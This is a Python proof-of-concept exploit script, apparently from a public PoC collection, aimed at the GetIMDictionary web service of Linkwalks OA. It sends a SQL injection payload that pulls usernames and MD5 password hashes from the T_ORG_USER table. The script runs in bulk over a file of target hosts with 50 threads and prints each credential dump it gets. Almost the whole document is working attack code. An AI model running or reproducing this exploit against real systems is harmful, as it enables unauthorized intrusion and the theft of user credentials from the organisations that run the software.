#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fid="/yV4r5PdARKT4jaqLjJYqw=="

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+-------------------------------------------------------------------------------------------------- -------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                       +')
    print(
        '+ EXP: python3 Linkwalks_OA_GetIMDictionary_Sql_Poc.py url.txt                                                  +')
    print(
        '+-------------------------------------------------------------------------------------------------- --------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080'
} 
def poc(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Chrome/83.0.4103.116 Safari/537.36",
        "Accept-Encoding":"gzip, deflate",
        "Accept": "*/*",
        "Connection":"close",
        "Content-Type":"application/x-www-form-urlencoded",
        "Content-Length":"89",
        "Host":"%s" % host2

    }
    vulurl = url + "/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"
    data="dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --"
    try:
        r = requests.post(vulurl, headers=headers,data=data)
        # print(r.content)
        path = r.text.replace('\"',"").replace('{',"").replace('}',"").split('value=')[1].split('&gt;&lt;/')[0]
        if r.status_code==200 and str(path) != " ": 
            print(host+":true 账号+MD5为:"+path)
            
        else:
            return 0
    except:
        return 0


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])